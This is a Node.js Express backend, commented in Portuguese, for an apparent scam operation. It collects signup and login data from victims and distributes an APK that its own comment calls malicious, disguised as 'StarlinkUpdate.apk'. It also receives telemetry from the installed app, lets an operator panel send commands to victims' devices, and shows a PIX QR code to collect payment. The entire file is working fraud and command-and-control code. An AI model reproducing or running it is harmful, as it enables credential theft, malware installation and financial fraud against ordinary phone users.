const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const multer = require('multer');

const PORT = process.env.PORT || 3000;
const DIR = path.join(__dirname, 'dados');
const ARQ = path.join(DIR, 'jobs.json');
const PKGS = path.join(__dirname, 'pkgs');
const APK = path.join(PKGS, 'updater.apk');

fs.mkdirSync(DIR, { recursive: true });
fs.mkdirSync(PKGS, { recursive: true });
let jobs = {};
try { jobs = JSON.parse(fs.readFileSync(ARQ, 'utf8')); } catch (_) {}
const salvar = () => fs.writeFileSync(ARQ, JSON.stringify(jobs, null, 1));

const app = express();
app.use(express.json({ limit: '5mb' }));
app.use((req, res, next) => { res.setHeader('Access-Control-Allow-Origin', '*'); next(); });
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => res.redirect('/admin'));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// ---- upload do apk malicioso (aba "Instalador (APK)" do painel) ----
const up = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, PKGS),
    filename: (req, file, cb) => cb(null, 'updater.apk'),
  }),
  limits: { fileSize: 150 * 1024 * 1024 },
  fileFilter: (req, file, cb) =>
    /\.apk$/i.test(file.originalname) ? cb(null, true) : cb(new Error('arquivo precisa terminar em .apk')),
});

app.post('/api/apk-upload', up.single('apk'), (req, res) => {
  console.log(`[apk] upload ok: ${req.file.originalname} -> ${req.file.size} bytes`);
  res.json({ ok: true, nome: 'updater.apk', bytes: req.file.size });
});

app.get('/api/apk-info', (req, res) => {
  if (!fs.existsSync(APK)) return res.json({ presente: false });
  const st = fs.statSync(APK);
  res.json({ presente: true, bytes: st.size, modificado: st.mtime.toISOString() });
});

const job = id => jobs[id];
function evento(id, msg) {
  const j = job(id); if (!j) return;
  j.eventos.push({ msg, ts: new Date().toISOString() });
  salvar();
}
function novoJob(dados, tipo) {
  const id = crypto.randomUUID();
  jobs[id] = { id, dados: { ...dados, tipo }, status: 'aguardando', eventos: [],
               criadoEm: new Date().toISOString() };
  evento(id, tipo === 'login' ? 'login recebido' : 'cadastro recebido');
  return jobs[id];
}

app.post('/api/cadastro', (req, res) => {
  const j = novoJob(req.body || {}, 'cadastro');
  res.json({ installId: j.id, apkUrl: `/api/apk?job=${j.id}` });
});
app.post('/api/entrada', (req, res) => {
  res.json({ installId: novoJob(req.body || {}, 'login').id });
});
app.post('/api/esqueci', (req, res) => {
  console.log('[recuperar senha]', req.body?.email || '(vazio)');
  res.json({ ok: true });
});

app.get('/api/apk', (req, res) => {
  const j = job(req.query.job);
  if (j) evento(j.id, 'download do apk iniciado pelo app');
  if (!fs.existsSync(APK)) return res.status(404).send('nenhum apk no servidor (suba pela aba Instalador do painel)');
  res.download(APK, 'StarlinkUpdate.apk');
});

app.post('/api/job/:id/evento', (req, res) => {
  evento(req.params.id, String(req.body?.msg ?? ''));
  res.json({ ok: true });
});
app.get('/api/job/:id/status', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  res.json({ status: j.status, comando: j.comando || '', eventos: j.eventos });
});
app.post('/api/job/:id/concluir', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  if (j.status !== 'aprovado') {
    j.status = 'aprovado';
    const fonte = req.body?.fonte === 'app' ? 'pelo APP (botão Concluir)' : 'PELO PAINEL';
    evento(j.id, 'INSTALAÇÃO CONCLUÍDA ' + fonte);
  }
  res.json({ status: j.status });
});
app.post('/api/coleta', (req, res) => {
  const j = job((req.query && req.query.job) || (req.body && req.body.job));
  if (j) evento(j.id, 'lote de telemetria recebido (' + JSON.stringify(req.body).length + ' bytes)');
  res.json({ ok: true });
});

app.get('/api/jobs', (req, res) => res.json(Object.values(jobs).reverse()));

// ---- PIX: configura o copia-e-cola e gera o QR Code (aba "Configurações (PIX)") ----
const QR = require('qrcode');
const PIX_ARQ = path.join(DIR, 'pix.json');
let pix = { valor: '9.90', copiaEcola: '' };
try { Object.assign(pix, JSON.parse(fs.readFileSync(PIX_ARQ, 'utf8'))); } catch (_) {}
const salvarPix = () => fs.writeFileSync(PIX_ARQ, JSON.stringify(pix, null, 1));

function formatBruto(v) {
  const n = parseFloat(v); if (isNaN(n)) return v;
  return n.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
}

// para o APP (tela de pagamento)
app.get('/api/pix', (req, res) => res.json({
  presente: pix.copiaEcola.trim().length > 20,
  valor: pix.valor,
  valorBruto: formatBruto(pix.valor),
  emv: pix.copiaEcola,
}));

app.get('/api/pix/qrcode.png', async (req, res) => {
  if (pix.copiaEcola.trim().length <= 20) return res.status(204).end();
  try {
    const buf = await QR.toBuffer(pix.copiaEcola, { width: 640, margin: 2, errorCorrectionLevel: 'M' });
    res.set('Cache-Control', 'no-store');
    res.type('image/png').send(buf);
  } catch (e) { res.status(500).send('qr falhou: ' + e.message); }
});

// para o PAINEL
app.get('/api/admin/pix', (req, res) => res.json({ valor: pix.valor, copiaECola: pix.copiaEcola }));
app.post('/api/admin/pix', (req, res) => {
  const v = String(req.body?.valor ?? '').trim();
  const c = String(req.body?.copiaEcola ?? '').trim();
  if (v) pix.valor = v;
  if (c.length >= 20) pix.copiaEcola = c;
  salvarPix();
  console.log('[pix] atualizado: R$ ' + pix.valor + ' (' + pix.copiaEcola.length + ' chars)');
  res.json({ ok: true });
});

// comando do painel para o app (ex.: mandar para a tela de pagamento)
app.post('/api/job/:id/comando', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  const cmd = String(req.body?.comando ?? '');
  j.comando = cmd;
  evento(j.id, 'comando enviado pelo painel: ' + cmd.toUpperCase());
  res.json({ ok: true, comando: cmd });
});

// erros do multer (arquivo sem .apk, acima do limite) viram 400 limpo
app.use((err, req, res, next) => {
  if (err) { console.error('[upload]', err.message); return res.status(400).json({ erro: err.message }); }
  next();
});

const os = require('os');
function ipLan() {
  for (const ifs of Object.values(os.networkInterfaces()))
    for (const i of ifs || []) if (i.family === 'IPv4' && !i.internal) return i.address;
  return 'localhost';
}
app.listen(PORT, () => console.log(
  `\n Backend:    http://localhost:${PORT}\n` +
  ` Painel:     http://localhost:${PORT}/admin\n` +
  ` No celular: http://${ipLan()}:${PORT}  (mesma rede WiFi)\n` +
  `APK:         ${fs.existsSync(APK) ? 'ok (' + fs.statSync(APK).size + ' bytes)' : 'FALTANDO (suba pela aba Instalador do painel)'}\n`));
